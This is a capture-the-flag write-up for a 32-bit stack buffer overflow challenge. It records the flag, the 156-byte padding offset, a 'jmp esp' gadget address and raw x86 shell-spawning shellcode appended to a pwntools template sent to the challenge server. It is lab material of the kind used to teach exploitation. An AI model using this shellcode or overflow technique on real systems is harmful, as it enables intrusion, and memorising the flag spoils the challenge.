# Flag

> Hacking-Arena{Just_a_yellow_lemon_tree}

# Prompt

> I wonder how, I wonder why you cannot solve this binary.

> nc koala2.hackingarena.no 805 nc koala.hackingarena.com 805 (same binary)

# Solution

Determine the necessary size of padding for the attached binary.

Used a random string of numbers and letters to trace how long the padding is.

sF3iUtuwHsfYphKvQZjZp7EczBF4VjHplrQXVojWnv6Ns9m5YRpxMX0OEfCRn5I28hTD4BYrYXvz4hCUSWBrpHXOpPl2eNhTiGy7twXkUW0vL2M54xFdOgeIs7ZFn258PtEc7pgomdqarRVdRnBn78UJOZ85EQoCJm9KUCyVPGexQiNUAzUHIe5MiMzDWQbz6O98mtQqByIXaWmV4CfIXy0mFMeCWr1ea

![[Pasted image 20241115174836.png]]

The EIP tells us that the padding ended before EQoC from the random string, 

Run binary file and attempt to crash when output equals "... , But nothing ever".



Padding is equal to 156, so I proceed by finding the return address of the binary file (jmp esp)

Edit template.py to match padding of 156




Run template.py and debug using GDB, then search and find 'jmp esp'



Run template.py, debug and search for 'jmp esp' using pwndbg:

search --asm 'jmp esp'



Add a payload for template.py:
payload+= p32(0x8049243)

Edit template.py and include 'jmp esp' as a payload.



Add another payload, the same payload from the strawberry CTF.
payload+='\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'

Additionally, add the payload used in "Strawberry Exploit".


Lastly, run template.py on web server and port.

"cat flag" to find CTF flag
# Additional Info

Additional solution / info